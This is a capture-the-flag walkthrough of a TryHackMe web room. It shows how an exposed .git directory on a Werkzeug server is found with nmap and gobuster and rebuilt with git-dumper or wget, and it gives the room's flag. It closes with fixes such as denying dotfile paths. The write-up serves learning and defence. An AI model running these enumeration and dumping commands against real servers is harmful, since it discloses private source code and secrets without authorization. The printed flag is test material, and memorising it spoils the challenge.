---
title: "Room 404"
description: "The Byte Lotus guest app was shipped straight from a developer's working directory, including its .git folder. A content discovery scan finds the repository, git-dumper or wget reconstructs it, and an internal README gives up the staging flag."
difficulty: "Very Easy"
tags: ["TryHackMe", "Hacker Holidays", "Web", "Directory Enumeration", "Git Exposure", "git-dumper", "Information Disclosure", "Source Code Review"]
date: "2026-07-28"
---

## Overview

Room 404 is a Hacker Holidays 2026 web challenge built around one of the most common deployment mistakes: copying a working directory into a web root without removing the version-control metadata. The Byte Lotus Hotel's guest-experience platform is a static landing page on port 8080, but behind it sits a readable `.git` directory. That directory contains the whole repository — `HEAD`, refs, the object database, and the staging index — so anyone who can request those files can rebuild the source tree offline.

The challenge is deliberately small. There is no login form to attack, no injection point, and no shell to catch. The objective is simply to dump the exposed source code and find the flag. It is a useful exercise because it teaches two habits that scale to real engagements: check for hidden version-control directories, and understand what to do once you find one.

![Diagram of the Room 404 attack path: scan port 8080, discover the exposed git directory, reconstruct the repository, and read the staging flag](/assets/screenshots/room404/attack-chain.svg)

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe — Hacker Holidays 2026, Day 2 |
| Room | Room 404 |
| Difficulty | Very Easy |
| Category | Web / Information Disclosure |
| Target | `10.48.184.45` at scan time (instance-specific) |
| Open ports | 22, 8080 |
| Web server | Werkzeug 3.0.1 (Python 3.12.3) |
| Application | Byte Lotus guest-experience platform |
| Objectives | Dump the exposed source code; find the flag |
| Flag | `THM{byt3_l0tus_n3v3r_f0rg3ts}` |
| Skills | Service scanning, web content discovery, exposed `.git` recognition, Git internals, repository reconstruction, source review |

TryHackMe reassigns target IPs when instances restart, so the commands below use `TARGET` as a placeholder.

The room folder contained `nmap.txt`, `dir.txt`, `index.html`, `app.js`, `README.md`, and the reconstructed `.git` directory itself. The nmap header records a scan started on 28 July 2026 at 23:28:46, and the recovered source files were written at 23:41; that is the basis for the post date. There is no `.completed` marker. The folder had no screenshots, so the terminal images below come from published writeups credited in References. The two diagrams are original to this post.

The room's briefing describes a hotel room "not on the floor plan" and hints that the night-shift developer "shipped more than the website." Both lines point at the same thing: files that exist on the server but are not linked from the app.

## Enumeration

### Service Scan

The local notes start with a version-and-script scan:

```bash
nmap -sV -sC -oN nmap.txt 10.48.184.45
```

```text
# Nmap 7.98 scan initiated Tue Jul 28 23:28:46 2026
Nmap scan report for 10.48.184.45
Host is up (0.058s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Werkzeug 3.0.1 (Python 3.12.3)
|_http-title: Byte Lotus &mdash; Stay Noticed
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
| http-git:
|   10.48.184.45:8080/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: initial Byte Lotus guest platform
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only port 8080 matters here. The title confirms the Byte Lotus landing page, and the server header shows a Python Werkzeug development server rather than a hardened production stack. That alone is a hint that this may be a staging deployment.

The most important part is the `http-git` script output. Nmap's default script suite includes a check that requests common Git metadata paths and tries to recognise a repository. It has already answered the room's main question: `/.git/` is exposed, and the last commit is named `initial Byte Lotus guest platform`. A careful read of the scan output would make the rest of the room almost immediate.

### The Public Page

Opening the site shows a polished hotel landing page with a booking call to action:

![The Byte Lotus guest portal served on port 8080](/assets/screenshots/room404/bytelotus-home.png)

The navigation links are placeholders, and the "Reserve a stay" button points to `/booking`, which does not lead anywhere useful. The recovered `app.js` confirms that this is a front-end stub:

```js
// Byte Lotus guest app — front-end stub
// concierge personalization is served from the profiling service.
const API = "/api/guest";
async function greet() {
  // TODO: wire to live endpoint before launch
  console.log("welcome back. your usual?");
}
greet();
```

There is no API call and no form to abuse. When the visible application has no attack surface, the next question is what invisible files the web server is willing to serve.

### Finding the Hidden Repository

A content-discovery scan is the standard way to answer that question. `gobuster` with a small common-path wordlist is enough:

```bash
gobuster dir \
  -u http://TARGET:8080/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x html,js,php,txt,git -t 50
```

The interesting result is exactly the one nmap predicted:

```text
.git/HEAD           (Status: 200) [Size: 21]
```

That single line is the local `dir.txt` file, minus its terminal colour codes. A `200` response for `.git/HEAD` means the web server is returning Git's internal pointer file as if it were an ordinary static asset.

![Gobuster result showing .git/HEAD returned with HTTP 200](/assets/screenshots/room404/gobuster-git.png)

You do not actually need a wordlist for this room. Testing a handful of developer leftovers by hand — `/.git/`, `/.env`, `/.svn/`, `/.hg/` — takes seconds and would find it immediately. The value of the scan is that it demonstrates the general technique and does not require knowing the filename in advance.

### Confirming the Exposure

Before downloading anything, it is worth confirming what is reachable. `HEAD` should contain a plain-text reference to the current branch:

```bash
curl -i http://TARGET:8080/.git/HEAD
```

```text
ref: refs/heads/main
```

The repository description is visible too, and the object store is readable. The web server also has directory indexing enabled for `.git/`:

```bash
curl http://TARGET:8080/.git/
```

![Directory listing of the exposed .git folder](/assets/screenshots/room404/git-directory-listing.png)

The listing exposes `HEAD`, `config`, `index`, `logs/`, `objects/`, and `refs/`. Directory browsing is a second misconfiguration: even if a scanner did not know the exact object filenames, an attacker could walk the tree and collect them.

## Why an Exposed .git Directory Is Serious

A common misconception is that a `.git` folder only contains metadata. In reality it is the entire history and content store of the project. The important pieces are:

- `.git/HEAD` — a plain-text pointer such as `ref: refs/heads/main`.
- `.git/refs/heads/main` — the SHA-1 of the commit at the tip of the branch.
- `.git/objects/` — zlib-compressed commits, trees, and file blobs, named by their SHA-1 hashes.
- `.git/index` — the staging index that maps working-tree paths to blob hashes.
- `.git/logs/` — the reflog, which can reveal commits that are no longer on any branch.

Following those references is enough to reconstruct every file that was ever committed, including files deleted in later commits and secrets accidentally committed by developers.

![How Git references, objects, trees, and blobs reconstruct the source tree](/assets/screenshots/room404/git-objects.svg)

The recovered local repository shows exactly that structure. It contains a single commit, so there is no long history to search:

```bash
git log --oneline --all
```

```text
0f13550 initial Byte Lotus guest platform
```

```bash
git ls-tree -r HEAD
```

```text
100644 blob a5965c580fee91d852e5b19a8290da02d2926523  README.md
100644 blob 2575ab073f67615a27135663ed36794c2d2584fb  app.js
100644 blob 0a12caa4e52a965e89e5eccf5760924b21aacbf7  index.html
```

Three tracked files: `README.md`, `app.js`, and `index.html`. Because the index and objects are intact, the working tree can be materialised with Git itself rather than by reassembling compressed blobs by hand.

## Initial Access — Dumping the Repository

### Method 1 — git-dumper

`git-dumper` is purpose-built for this situation. It walks the exposed metadata over HTTP, follows the object references, and checks out a working copy locally:

```bash
pip install git-dumper --break-system-packages
git-dumper http://TARGET:8080/.git/ ./byte-lotus-source
cd byte-lotus-source
ls -la
```

The tool knows which files to request and in what order. It also handles the object database correctly, so the result is a normal Git repository rather than a pile of raw files:

![Files in the repository reconstructed with git-dumper](/assets/screenshots/room404/git-dumper-files.png)

The recovered workspace contains `README.md`, `app.js`, and `index.html`, matching the local tree exactly.

### Method 2 — wget Mirror and git checkout

The directory listing makes a manual mirror possible as well. `wget --mirror` recursively downloads everything under the exposed path, and `-nH` avoids creating a directory named after the host:

```bash
wget --mirror -nH -P ./repodump http://TARGET:8080/.git/
cd repodump
ls -la
```

At this stage the directory contains Git internals, not necessarily a clean working tree:

![Git metadata downloaded with wget --mirror](/assets/screenshots/room404/wget-dump-files.png)

Git can rebuild the files from that metadata:

```bash
git checkout .
ls -la
```

![Recovering the working tree with git checkout](/assets/screenshots/room404/git-checkout.png)

After the checkout, the same three source files appear. This is why exposing `.git` is equivalent to exposing source code even when directory browsing is disabled: the files are encoded in the object database, not stored as plain copies.

The two methods lead to the same result. `git-dumper` is faster and less error-prone; the `wget` approach is useful when you want to understand exactly what is being downloaded or when a dedicated tool is unavailable.

## Flag

With the source tree restored, review the files manually. The flag is not in the landing page or JavaScript; it is in the internal staging notes:

```bash
cat README.md
```

```text
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
```

![The staging flag in the recovered README.md](/assets/screenshots/room404/readme-flag.png)

| Flag | Location | Value |
|------|----------|-------|
| Staging flag | `README.md` in the dumped repository | `THM{byt3_l0tus_n3v3r_f0rg3ts}` |

The value comes from the local room folder and is displayed in two of the three published writeups consulted; the third masks it in its screenshots.

## Privilege Escalation

There is no privilege escalation phase in Room 404. The challenge does not provide a shell on the target machine and does not ask for root. The whole "access" is anonymous HTTP access to static files that should never have been served.

If you want to frame it in escalation terms, the transition is from *visitor of the public website* to *reader of the private repository*. That happens at the web-server configuration layer, not through a Linux privilege bug. Any exploit chain claiming a root shell or system flag for this room would be inventing content that the room does not contain.

## Commands Used

| Command | Purpose |
|---------|---------|
| `nmap -sV -sC -oN nmap.txt TARGET` | Fingerprint services; the `http-git` script flags the exposed repository |
| `gobuster dir -u http://TARGET:8080/ -w common.txt -x html,js,php,txt,git -t 50` | Confirm hidden paths; finds `.git/HEAD` with status 200 |
| `curl -i http://TARGET:8080/.git/HEAD` | Verify the plain-text Git pointer is served |
| `curl http://TARGET:8080/.git/` | View the directory listing of Git internals |
| `pip install git-dumper --break-system-packages` | Install the repository reconstruction tool |
| `git-dumper http://TARGET:8080/.git/ ./byte-lotus-source` | Download and check out the exposed repository |
| `wget --mirror -nH -P ./repodump http://TARGET:8080/.git/` | Alternative: mirror the raw `.git` tree over HTTP |
| `git checkout .` | Alternative: rebuild the working tree from downloaded Git metadata |
| `git log --oneline --all`, `git ls-tree -r HEAD` | Inspect commit history and tracked files |
| `cat README.md` | Read the internal staging note containing the flag |

## Lessons Learned

**Dotfiles are part of the attack surface.** `.git`, `.env`, `.svn`, and similar directories are invisible to normal users but perfectly readable to a web server if deployed. A deployment that copies a developer's working directory into the web root publishes all of them.

**Scanners can find configuration mistakes quickly.** Nmap's `http-git` script flagged the repository during the initial service scan, and gobuster confirmed it with a single `200`. Beginner rooms often reward simply reading scanner output carefully before reaching for a more complex exploit.

**Directory listing amplifies the impact.** With indexing enabled, an attacker can browse the object store and see every file Git needs. Disabling directory browsing is not a fix for an exposed `.git`, but it removes the easiest path.

**Git metadata is a portable source archive.** `HEAD` leads to refs, refs lead to commits, commits lead to trees, and trees lead to blobs. `git-dumper` automates that chain; `wget --mirror` plus `git checkout .` does the same thing more manually. Deleting a file from the current commit does not remove it from history.

**Internal notes leak secrets.** The flag was not in application code but in a README that said "remove before launch." Real repositories contain similar notes: staging passwords, API tokens, connection strings, and TODO comments with credentials. Source review should include non-code files.

**Fix this at two layers.** Block dotfile access at the web server — for example, `location ~ /\.git { deny all; }` in nginx — and change the deployment process so only build artifacts reach the web root. A CI job that runs `git archive` or copies a clean export avoids the problem entirely. Secret scanning in pre-commit hooks is a useful last line of defence.

**Small rooms still model real bugs.** Exposed version-control directories are repeatedly found in bug-bounty programmes and breaches. This room strips away everything else so the lesson is easy to see: one careless deployment step can hand over an entire codebase.

## References

- [TryHackMe — Room 404 (Hacker Holidays 2026)](https://tryhackme.com/room/hh-room404-804573bf)
- [TryHackMe — Hacker Holidays](https://tryhackme.com/hackerholidays)
- [Hibullahi AbdulAzeez — TryHackMe Room 404 Walkthrough (InfoSec Write-ups)](https://infosecwriteups.com/tryhackme-room-404-walkthrough-hackers-holiday-challenge-f4f9a2b530e8)
- [GHOSTEYE — Hacker Holidays: The Byte Lotus Hotel, Room 404](https://medium.com/@Ghosteye44/hacker-holidays-the-byte-lotus-hotel-room-404-walkthrough-982aa776f977)
- [Debmalya Mondal — Room 404, Hacker Holidays Day 2](https://devdebug.medium.com/room-404-hacker-holidays-day-2-tryhackme-writeup-ac1ab341fd11) — source of most terminal screenshots
- [arthaud/git-dumper — reconstruct exposed Git repositories](https://github.com/arthaud/git-dumper)
- [Git Internals — Plumbing and Porcelain](https://git-scm.com/book/en/v2/Git-Internals-Plumbing-and-Porcelain)
